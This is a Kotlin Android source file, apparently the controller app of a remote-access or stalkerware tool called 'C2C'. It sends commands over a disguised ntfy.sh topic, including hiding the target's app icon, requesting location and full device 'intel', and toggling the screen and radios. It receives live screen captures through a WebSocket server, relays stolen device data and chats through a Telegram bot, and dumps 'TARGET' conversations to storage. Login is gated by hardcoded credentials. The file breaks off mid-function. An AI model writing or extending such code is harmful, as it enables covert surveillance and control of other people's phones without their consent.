package com.c2c

import android.Manifest
import android.annotation.SuppressLint
import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.view.ViewGroup
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.biometric.BiometricManager
import androidx.biometric.BiometricPrompt
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.gestures.detectDragGestures
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.pager.HorizontalPager
import androidx.compose.foundation.pager.rememberPagerState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.CutCornerShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.Font
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.IntOffset
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.FragmentActivity
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.compose.*
import coil.compose.AsyncImage
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.get
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.server.application.*
import io.ktor.server.engine.ApplicationEngine
import io.ktor.server.engine.embeddedServer
import io.ktor.server.routing.routing
import io.ktor.server.websocket.*
import io.ktor.websocket.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.math.roundToInt
import com.c2c.ui.theme.*

val CyberFont = FontFamily(Font(R.font.jetbrains_mono, FontWeight.Normal))
val UbuntuInputFont = FontFamily(Font(R.font.ubuntu_regular, FontWeight.Normal))

val CyberBlack = Color(0xFF09090B)
val CyberDarkGray = Color(0xFF14141A)
val CyberNeonCyan = Color(0xFF00F0FF)
val CyberNeonPink = Color(0xFFFF003C)
val CyberNeonYellow = Color(0xFFFCEE09)
val CyberWhite = Color(0xFFE2E2E2)
val LogDarkGreen = Color(0xFF006400)
val LogBrightGreen = Color(0xFF39FF14)
val LogMediumRed = Color(0xFFCC3333)

data class PushMessage(val id: Int, val label: String, val cmd: String, var arg: String = "", val requiresArg: Boolean = false, var iconUri: String? = null)
data class LiveApp(val name: String, val packageName: String, val iconUri: String? = null)
data class TelegramMsg(val id: Long, val text: String, val isMe: Boolean, val timestamp: Long, val photoId: String? = null, var downloadedPath: String? = null)

object ServerCore {
    var ktorServer: ApplicationEngine? = null
    var liveSession: WebSocketServerSession? = null
    val logsFlow = MutableSharedFlow<String>(replay = 50)
    val streamFlow = MutableSharedFlow<ByteArray>(replay = 5)
    var isRunning = false
    var lastStatusSlab = "WAITING FOR CONNECTION..."

    fun log(msg: String, isSuccess: Boolean? = null) {
        logsFlow.tryEmit("> $msg")
        if (isSuccess == true) lastStatusSlab = "SUCCESS: $msg"
        else if (isSuccess == false) lastStatusSlab = "FAILURE: $msg"
    }
}

class C2ServerService : Service() {
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("c2c_server", "C2C WebSocket Server", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val port = intent?.getIntExtra("port", 8765) ?: 8765
        val notification = NotificationCompat.Builder(this, "c2c_server")
            .setContentTitle("C2C Node Active")
            .setContentText("WebSocket Server running on port $port")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else startForeground(1, notification)
        startKtor(port)
        return START_STICKY
    }
    private fun startKtor(port: Int) {
        if (ServerCore.isRunning) return
        try {
            ServerCore.ktorServer = embeddedServer(io.ktor.server.cio.CIO, port = port, host = "0.0.0.0") {
                install(WebSockets)
                routing {
                    webSocket("/live") {
                        ServerCore.liveSession = this
                        ServerCore.log("CLIENT CONNECTED: ${call.request.local.remoteHost}", true)
                        try {
                            for (frame in incoming) {
                                when (frame) {
                                    is Frame.Text -> {
                                        val txt = frame.readText()
                                        ServerCore.log("RECV_JSON: $txt")
                                    }
                                    is Frame.Binary -> ServerCore.streamFlow.emit(frame.readBytes())
                                    else -> {}
                                }
                            }
                        } finally {
                            ServerCore.log("CLIENT DISCONNECTED", false)
                            ServerCore.liveSession = null
                        }
                    }
                }
            }.start(wait = false)
            ServerCore.isRunning = true
            ServerCore.log("WEBSOCKET SERVER STARTED ON 0.0.0.0:$port", true)
        } catch (e: Exception) { ServerCore.log("SERVER CRASH: ${e.message}", false) }
    }
    override fun onDestroy() {
        ServerCore.ktorServer?.stop(1000, 2000)
        ServerCore.isRunning = false; ServerCore.liveSession = null
        ServerCore.log("SERVER TERMINATED.", false)
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}

class CyberViewModel(application: Application) : AndroidViewModel(application) {
    private val prefs = application.getSharedPreferences("CyberConfig", Context.MODE_PRIVATE)

    var serverUrl by mutableStateOf(prefs.getString("serverUrl", "https://ntfy.sh") ?: "https://ntfy.sh")
    var topic by mutableStateOf(prefs.getString("topic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789")
    var pushMessages = mutableStateListOf<PushMessage>()
    var liveAppsList = mutableStateListOf<LiveApp>()

    var localServerPort by mutableStateOf("8765")
    var isServerRunning by mutableStateOf(ServerCore.isRunning)
    var serverLogs = mutableStateListOf<String>()
    var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)

    var isMicRunning by mutableStateOf(false)
    var liveScreenJsonData by mutableStateOf("")
    var liveScreenFrame by mutableStateOf<ByteArray?>(null)

    var showAdvancedInfoModal by mutableStateOf(false)
    var advancedInfoData by mutableStateOf(JSONObject())
    var showScanResultsModal by mutableStateOf(false)
    var scanResults by mutableStateOf<List<Pair<String, String>>>(emptyList())
    var currentScanType by mutableStateOf("")

    var tgToken by mutableStateOf(prefs.getString("tgToken", "") ?: "")
    var tgChatId by mutableStateOf(prefs.getString("tgChatId", "") ?: "")
    var isTgLoggedIn by mutableStateOf(tgToken.isNotBlank() && tgChatId.isNotBlank())
    var isTgPollingActive by mutableStateOf(prefs.getBoolean("tgPollingActive", true))
    var tgPollingDelay by mutableStateOf(prefs.getLong("tgPollingDelay", 0L))
    private var pollingJob: Job? = null
    var tgMessages = mutableStateListOf<TelegramMsg>()
    private var tgOffset = 0L

    val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }

    init {
        loadMessages()
        viewModelScope.launch(Dispatchers.Main) {
            ServerCore.logsFlow.collect { log ->
                if (serverLogs.size > 200) serverLogs.removeAt(0)
                serverLogs.add(log)
                latestSlabTxt = ServerCore.lastStatusSlab
                
                if (log.contains("RECV_JSON:") && log.contains("\"type\":\"live_screen\"")) {
                    try {
                        val jsonStr = log.substringAfter("RECV_JSON: ")
                        val data = JSONObject(jsonStr).getJSONObject("data").toString(4)
                        liveScreenJsonData = data
                        dumpScreenJson(data)
                    } catch(e:Exception){}
                }
                
                if (log.contains("RECV_JSON:") && log.contains("\"type\":\"scan_results\"")) {
                    try {
                        val jsonStr = log.substringAfter("RECV_JSON: ")
                        val data = JSONObject(jsonStr)
                        val resultsArray = data.getJSONArray("data")
                        val parsedResults = mutableListOf<Pair<String, String>>()
                        for (i in 0 until resultsArray.length()) {
                            val item = resultsArray.getJSONObject(i)
                            parsedResults.add(Pair(item.getString("name"), item.getString("details")))
                        }
                        scanResults = parsedResults
                        currentScanType = data.optString("scan_type", "NETWORK")
                        showScanResultsModal = true
                    } catch(e: Exception){
                        ServerCore.log("ERROR: Failed to parse scan results", false)
                    }
                }
            }
        }
        viewModelScope.launch(Dispatchers.IO) {
            ServerCore.streamFlow.collect { bytes ->
                if (bytes.firstOrNull()?.toInt() == 0x03) liveScreenFrame = bytes.copyOfRange(1, bytes.size)
            }
        }
        if (isTgLoggedIn) startTelegramPolling()
    }

    private fun dumpScreenJson(data: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = File(Environment.getExternalStorageDirectory(), "c2c_dumps")
                if (!dir.exists()) dir.mkdirs()
                File(dir, "screen_ui_${System.currentTimeMillis()}.json").writeText(data)
            } catch (e: Exception){}
        }
    }

    fun saveConfig(newUrl: String, newTopic: String) {
        serverUrl = newUrl; topic = newTopic
        prefs.edit().putString("serverUrl", serverUrl).putString("topic", topic).apply()
        ServerCore.log("SYS: Config Saved", true)
    }

    fun saveNewCommand(label: String, cmd: String, requiresArg: Boolean) {
        pushMessages.add(PushMessage(System.currentTimeMillis().toInt(), label, cmd, "", requiresArg))
        persistMessages()
    }
    
    fun updateCommandIcon(id: Int, uri: String) {
        val i = pushMessages.indexOfFirst { it.id == id }
        if (i != -1) { pushMessages[i] = pushMessages[i].copy(iconUri = uri); persistMessages() }
    }

    private fun persistMessages() {
        val array = JSONArray()
        pushMessages.forEach { m -> array.put(JSONObject().put("id", m.id).put("label", m.label).put("cmd", m.cmd).put("arg", m.arg).put("requiresArg", m.requiresArg).put("iconUri", m.iconUri ?: "")) }
        prefs.edit().putString("messages", array.toString()).apply()
    }
    
    private fun loadMessages() {
        val data = prefs.getString("messages", null)
        if (data != null) {
            try {
                val array = JSONArray(data)
                for (i in 0 until array.length()) {
                    val o = array.getJSONObject(i)
                    pushMessages.add(PushMessage(o.getInt("id"), o.getString("label"), o.getString("cmd"), o.optString("arg", ""), o.getBoolean("requiresArg"), o.optString("iconUri", "").takeIf { it.isNotBlank() }))
                }
            } catch (e: Exception) {}
        } else {
            saveNewCommand("Wake", "live_start", true)
            saveNewCommand("Change Name", "change_name", true)
            saveNewCommand("WIFI On/Off", "wifi_toggle", false)
            saveNewCommand("BT On/Off", "bt_toggle", false)
            saveNewCommand("WIFI Scan", "wifi_scan", false)
            saveNewCommand("Hide Tray", "hide_icon", false)
            saveNewCommand("Show Tray", "show_icon", false)
        }
    }
    
    fun addLiveApp(name: String, pkg: String, uri: String?) { liveAppsList.add(LiveApp(name, pkg, uri)) }

    suspend fun pushNtfy(cmd: String, arg: String = "") {
        withContext(Dispatchers.IO) {
            try {
                val safeCmd = cmd.replace("\"", "\\\"")
                val payload = if (arg.isNotBlank()) """{"cmd": "$safeCmd", "arg": "${arg.replace("\"", "\\\"")}"}""" else """{"cmd": "$safeCmd"}"""
                val targetUrl = if (serverUrl.startsWith("http")) "${serverUrl.trimEnd('/')}/$topic" else "https://$serverUrl/${topic.trimEnd('/')}"
                httpClient.post(targetUrl) { setBody(payload) }
                ServerCore.log("PUSH SUCCESS: $payload", true)
            } catch (e: Exception) { ServerCore.log("PUSH ERROR: ${e.message}", false) }
        }
    }

    fun toggleServer(context: Context) {
        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", localServerPort.toIntOrNull() ?: 8765) }
        if (ServerCore.isRunning) { context.stopService(intent); isServerRunning = false } 
        else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent); isServerRunning = true }
    }

    fun sendLive(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            if (ServerCore.liveSession?.isActive == true) {
                val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
                ServerCore.liveSession?.send(Frame.Text(json))
                ServerCore.log("SENT_CMD: $json", true)
            } else ServerCore.log("ERROR: Client Offline", false)
        }
    }

    fun sendLiveAudioBytes(bytes: ByteArray) {
        viewModelScope.launch(Dispatchers.IO) {
            if (ServerCore.liveSession?.isActive == true) ServerCore.liveSession?.send(Frame.Binary(true, bytes))
        }
    }

    fun loginTelegram(token: String, chatId: String) {
        tgToken = token; tgChatId = chatId; isTgLoggedIn = true; isTgPollingActive = true
        prefs.edit().putString("tgToken", token).putString("tgChatId", chatId).putBoolean("tgPollingActive", true).apply()
        startTelegramPolling()
    }
    fun logoutTelegram() {
        isTgLoggedIn = false; isTgPollingActive = false; tgToken = ""; tgChatId = ""; tgMessages.clear(); pollingJob?.cancel()
        prefs.edit().remove("tgToken").remove("tgChatId").putBoolean("tgPollingActive", false).apply()
    }
    fun togglePolling() {
        isTgPollingActive = !isTgPollingActive
        prefs.edit().putBoolean("tgPollingActive", isTgPollingActive).apply()
        if (isTgPollingActive) startTelegramPolling() else pollingJob?.cancel()
    }
    fun setPollingSpeed(delayMs: Long) {
        tgPollingDelay = delayMs; prefs.edit().putLong("tgPollingDelay", delayMs).apply()
        if (isTgPollingActive) startTelegramPolling()
    }

    fun dumpChats() {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = File(Environment.getExternalStorageDirectory(), "c2c_dumps")
                if (!dir.exists()) dir.mkdirs()
                val dumpFile = File(dir, "chat_dump_${System.currentTimeMillis()}.txt")
                val sb = StringBuilder()
                tgMessages.forEach { msg ->
                    val sender = if (msg.isMe) "ME" else "TARGET"
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(msg.timestamp))
                    sb.append("[$date] $sender: ${msg.text}\n")
                }
                dumpFile.writeText(sb.toString())
                ServerCore.log("Chats dumped to ${dumpFile.absolutePath}", true)
            } catch (e: Exception) { ServerCore.log("Dump failed: ${e.message}", false) }
        }
    }
    
    fun getTelegramFileUrl(fileId: String, onResult: (String) -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$tgToken/getFile?file_id=$fileId"
                val res = JSONObject(httpClient.get(url).bodyAsText())
                if (res.getBoolean("ok")) {
                    val filePath = res.getJSONObject("result").getString("file_path")
                    val fullUrl = "https://api.telegram.org/file/bot$tgToken/$filePath"
                    withContext(Dispatchers.Main) { onResult(fullUrl) }
                }
            } catch (e: Exception) {}
        }
    }

    @SuppressLint("MissingPermission")
    fun startMic() {
        if (isMicRunning) return
        isMicRunning = true
        viewModelScope.launch(Dispatchers.IO) {
            val sampleRate = 16000
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            val audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, bufferSize)
            if (audioRecord.state != AudioRecord.STATE_INITIALIZED) { isMicRunning = false; return@launch }
            audioRecord.startRecording()
            val buffer = ByteArray(bufferSize)
            while (isMicRunning) {
                val read = audioRecord.read(buffer, 0, buffer.size)
                if (read > 0) sendLiveAudioBytes(buffer.copyOfRange(0, read))
            }
            audioRecord.stop(); audioRecord.release()
        }
    }

    fun stopMic() { isMicRunning = false }

    private fun startTelegramPolling() {
        pollingJob?.cancel()
        if (!isTgPollingActive || !isTgLoggedIn) return
        pollingJob = viewModelScope.launch(Dispatchers.IO) {
            while (isActive && isTgLoggedIn && isTgPollingActive) {
                try {
                    val url = "https://api.telegram.org/bot$tgToken/getUpdates?offset=$tgOffset&timeout=60"
                    val response = httpClient.get(url).bodyAsText()
                    val json = JSONObject(response)
                    if (json.getBoolean("ok")) {
                        val result = json.getJSONArray("result")
                        for (i in 0 until result.length()) {
                            val update = result.getJSONObject(i)
                            tgOffset = update.getLong("update_id") + 1
                            val msg = update.optJSONObject("message") ?: continue
                            val text = msg.optString("text", "")
                            val date = msg.optLong("date") * 1000
                            val fromId = msg.optJSONObject("from")?.optString("id")
                            var photoId: String? = null
                            if (msg.has("photo")) {
                                val photos = msg.getJSONArray("photo")
                                photoId = photos.getJSONObject(photos.length() - 1).getString("file_id")
                            }
                            if (text.isNotBlank() || photoId != null) {
                                withContext(Dispatchers.Main) {
                                    val isMe = fromId == tgChatId
                                    if (text.startsWith("{") && text.contains("\"device_info\"")) {
                                        try {
                                            advancedInfoData = JSONObject(text)
                                            showAdvancedInfoModal = true
                                            ServerCore.log("SYS_INFO Received & Parsed", true)
                                        } catch (e: Exception) { tgMessages.add(TelegramMsg(tgOffset, text, isMe, date, photoId)) }
                                    } else {
                                        tgMessages.add(TelegramMsg(tgOffset, text, isMe, date, photoId))
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {}
                delay(tgPollingDelay)
            }
        }
    }

    fun sendTelegramMessage(text: String) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                httpClient.post("https://api.telegram.org/bot$tgToken/sendMessage") { setBody("""{"chat_id":"$tgChatId","text":"$text"}""") }
                withContext(Dispatchers.Main) { tgMessages.add(TelegramMsg(System.currentTimeMillis(), text, true, System.currentTimeMillis())) }
            } catch (e: Exception) {}
        }
    }
}

class MainActivity : FragmentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            AppTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    CyberAppNavigation(this)
                }
            }
        }
    }
    fun promptBiometric(onSuccess: () -> Unit, onError: (String) -> Unit) {
        val promptInfo = BiometricPrompt.PromptInfo.Builder().setTitle("CYBERNETIC AUTH").setSubtitle("Passkey required")
            .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG or BiometricManager.Authenticators.DEVICE_CREDENTIAL).build()
        BiometricPrompt(this, ContextCompat.getMainExecutor(this), object : BiometricPrompt.AuthenticationCallback() {
            override fun onAuthenticationError(c: Int, e: CharSequence) { onError(e.toString()) }
            override fun onAuthenticationSucceeded(r: BiometricPrompt.AuthenticationResult) { onSuccess() }
        }).authenticate(promptInfo)
    }
}

fun parseLogColor(log: String): AnnotatedString {
    return buildAnnotatedString {
        if (log.startsWith("> ")) {
            withStyle(SpanStyle(color = LogDarkGreen)) { append("> ") }
            val rest = log.substring(2)
            if (rest.contains("ERROR") || rest.contains("FAILURE") || rest.contains("CRASH") || rest.contains("DISCONNECTED")) {
                withStyle(SpanStyle(color = LogMediumRed)) { append(rest) }
            } else {
                val colonIdx = rest.indexOf(":")
                if (colonIdx != -1) {
                    val prefix = rest.substring(0, colonIdx)
                    if (prefix.all { it.isUpperCase() || it == '_' || it.isWhitespace() }) {
                        withStyle(SpanStyle(color = LogBrightGreen)) { append(prefix) }
                        withStyle(SpanStyle(color = CyberNeonYellow)) { append(rest.substring(colonIdx)) }
                    } else append(rest)
                } else append(rest)
            }
        } else append(log)
    }
}

@Composable
fun CyberAppNavigation(activity: MainActivity) {
    val navController = rememberNavController()
    val viewModel: CyberViewModel = viewModel()
    NavHost(navController = navController, startDestination = "login") {
        composable("login") { LoginScreen({ navController.navigate("main") { popUpTo("login") { inclusive = true } } }, activity) }
        composable("main") { MainScreen(viewModel) }
    }
}

@Composable
fun LoginScreen(onLoginSuccess: () -> Unit, activity: MainActivity) {
    var username by remember { mutableStateOf("") }; var password by remember { mutableStateOf("") }
    Column(modifier = Modifier.fillMaxSize().padding(24.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
        Icon(Icons.Default.Terminal, "Terminal", tint = CyberNeonCyan, modifier = Modifier.size(72.dp))
        Text("SYSTEM LOGIN", fontSize = 32.sp, fontFamily = CyberFont, color = CyberNeonCyan)
        Spacer(modifier = Modifier.height(32.dp))
        OutlinedTextField(value = username, onValueChange = { username = it }, label = { Text("USER_ID", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth())
        OutlinedTextField(value = password, onValueChange = { password = it }, label = { Text("PASSKEY", fontFamily = UbuntuInputFont) }, visualTransformation = PasswordVisualTransformation(), keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password), modifier = Modifier.fillMaxWidth())
        Spacer(modifier = Modifier.height(24.dp))
        Button(onClick = { if (username == "admin" && password == "pass226") onLoginSuccess() }, modifier = Modifier.fillMaxWidth().height(56.dp).border(1.dp, CyberNeonCyan, MaterialTheme.shapes.medium), colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent)) { Text("MANUAL OVERRIDE", fontFamily = CyberFont, color = CyberNeonCyan) }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = { activity.promptBiometric({ onLoginSuccess() }, {}) }, modifier = Modifier.fillMaxWidth().height(56.dp), colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink, contentColor = CyberBlack)) { Text("BIOMETRIC ACCESS", fontFamily = CyberFont, fontWeight = FontWeight.Bold) }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun MainScreen(viewModel: CyberViewModel) {
    var selectedTab by remember { mutableStateOf(0) }
    Scaffold(bottomBar = {
        NavigationBar(containerColor = CyberDarkGray) {
            NavigationBarItem(selected = selectedTab == 0, onClick = { selectedTab = 0 }, icon = { Icon(Icons.Default.Send, "Push") }, label = { Text("PUSH", fontFamily = CyberFont) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = CyberNeonCyan, indicatorColor = CyberNeonCyan))
            NavigationBarItem(selected = selectedTab == 1, onClick = { selectedTab = 1 }, icon = { Icon(Icons.Default.Settings, "Setup") }, label = { Text("SETUP", fontFamily = CyberFont) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = CyberNeonPink, indicatorColor = CyberNeonPink))
            NavigationBarItem(selected = selectedTab == 2, onClick = { selectedTab = 2 }, icon = { Icon(Icons.Default.Dns, "Server") }, label = { Text("SERVER", fontFamily = CyberFont) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = CyberNeonYellow, indicatorColor = CyberNeonYellow))
            NavigationBarItem(selected = selectedTab == 3, onClick = { selectedTab = 3 }, icon = { Icon(Icons.Default.Chat, "Chat") }, label = { Text("CHAT", fontFamily = CyberFont) }, colors = NavigationBarItemDefaults.colors(selectedIconColor = CyberBlack, selectedTextColor = Color.White, indicatorColor = Color.White))
        }
    }) { padding ->
        Box(modifier = Modifier.padding(padding).fillMaxSize()) {
            when (selectedTab) {
                0 -> PushTab(viewModel)
                1 -> SetupTab(viewModel)
                2 -> ServerTab(viewModel)
                3 -> TelegramTab(viewModel)
            }
        }
    }
}

@Composable
fun PushTab(viewModel: CyberViewModel) {
    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    var volLevel by remember { mutableFloatStateOf(50f) }
    var showLocDialog by remember { mutableStateOf(false) }
    var curIconMsgId by remember { mutableIntStateOf(-1) }

    val photoPicker = rememberLauncherForActivityResult(ActivityResultContracts.PickVisualMedia()) { uri ->
        if (uri != null) viewModel.updateCommandIcon(curIconMsgId, uri.toString())
    }

    if (viewModel.showAdvancedInfoModal) {
        Dialog(onDismissRequest = { viewModel.showAdvancedInfoModal = false }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
            Card(modifier = Modifier.fillMaxWidth(0.95f).fillMaxHeight(0.9f), colors = CardDefaults.cardColors(containerColor = CyberBlack), border = BorderStroke(1.dp, CyberNeonCyan)) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("ADVANCED SYSTEM INTEL", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                    Spacer(modifier = Modifier.height(8.dp))
                    LazyColumn(modifier = Modifier.weight(1f)) {
                        val keys = viewModel.advancedInfoData.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            val value = viewModel.advancedInfoData.optString(key)
                            item {
                                Column(modifier = Modifier.padding(vertical = 4.dp).border(1.dp, CyberDarkGray, MaterialTheme.shapes.small).padding(8.dp).fillMaxWidth()) {
                                    Text(key.uppercase(), color = CyberNeonYellow, fontFamily = CyberFont, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                    Text(value, color = CyberWhite, fontFamily = UbuntuInputFont, fontSize = 14.sp)
                                }
                            }
                        }
                    }
                    Button(onClick = { viewModel.showAdvancedInfoModal = false }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink)) { Text("CLOSE INTEL") }
                }
            }
        }
    }

    if (showLocDialog) {
        Dialog(onDismissRequest = { showLocDialog = false }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
            Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.8f), colors = CardDefaults.cardColors(containerColor = CyberDarkGray)) {
                Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
                    Text("DEVICE LOCATION", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                    Spacer(modifier = Modifier.height(16.dp))
                    AndroidView(factory = { WebView(it).apply { settings.javaScriptEnabled = true; loadUrl("https://maps.google.com/?q=26.1445,91.7362") } }, modifier = Modifier.weight(1f).fillMaxWidth())
                    Spacer(modifier = Modifier.height(16.dp))
                    Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                        Button(onClick = { context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("geo:26.1445,91.7362"))) }) { Text("External Map") }
                        Button(onClick = { showLocDialog = false }, colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink)) { Text("Close") }
                    }
                }
            }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(8.dp)) {
        Card(modifier = Modifier.fillMaxWidth().border(1.dp, CyberNeonYellow, MaterialTheme.shapes.small), colors = CardDefaults.cardColors(containerColor = CyberBlack)) {
            Column(modifier = Modifier.padding(8.dp)) {
                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                    IconButton(onClick = { scope.launch { viewModel.pushNtfy("flash", "toggle") } }) { Icon(Icons.Default.FlashlightOn, "Flash", tint = CyberNeonYellow) }
                    IconButton(onClick = { scope.launch { viewModel.pushNtfy("screen", "on") } }) { Icon(Icons.Default.ScreenLockLandscape, "Scr On", tint = CyberNeonCyan) }
                    IconButton(onClick = { scope.launch { viewModel.pushNtfy("screen", "off") } }) { Icon(Icons.Default.ScreenLockPortrait, "Scr Off", tint = CyberNeonPink) }
                    IconButton(onClick = { showLocDialog = true; scope.launch { viewModel.pushNtfy("loc") } }) { Icon(Icons.Default.LocationOn, "Loc", tint = Color.Green) }
                    IconButton(onClick = { scope.launch { viewModel.pushNtfy("info", "full") }; Toast.makeText(context, "Requesting Intel...", Toast.LENGTH_SHORT).show() }) { Icon(Icons.Default.Info, "Info", tint = CyberNeonYellow) }
                }
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.VolumeUp, "Vol", tint = CyberWhite)
                    Slider(value = volLevel, onValueChange = { volLevel = it }, valueRange = 0f..100f, modifier = Modifier.weight(1f))
                    IconButton(onClick = { scope.launch { viewModel.pushNtfy("vol", volLevel.toInt().toString()) } }) { Icon(Icons.Default.Send, "Set Vol", tint = CyberNeonCyan) }
                }
                Button(onClick = { context.startActivity(Intent(context, FileManagerActivity::class.java)) }, modifier = Modifier.fillMaxWidth().padding(top = 4.dp), colors = ButtonDefaults.buttonColors(containerColor = CyberDarkGray, contentColor = CyberNeonCyan), shape = CutCornerShape(8.dp), border = BorderStroke(1.dp, CyberNeonCyan)) {
                    Icon(Icons.Default.FolderSpecial, null); Spacer(modifier = Modifier.width(8.dp)); Text("DUAL-PANE FILE MANAGER", fontFamily = CyberFont, fontWeight = FontWeight.Bold)
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))

